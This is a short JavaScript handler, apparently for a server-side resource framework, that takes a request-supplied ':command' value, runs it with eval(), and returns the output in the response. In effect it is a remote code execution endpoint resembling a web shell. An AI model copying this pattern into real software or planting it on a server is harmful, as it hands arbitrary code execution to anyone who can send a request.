(function (res, writer, context) {
  var command = res.values[':command'];
  var path = context.getCurrentResourcePath();

  context.renderResource(path, '', '', function(contentType, content) {
    try {
      var tx = (content?content:'')+'\n';
      var rv = eval(command);
      res.values['_content'] = tx + rv;
    }
    catch(ex) {
      res.values['_content'] = tx + 'error:' + ex;
    }

    writer.write(res);
    writer.end();
  });
});
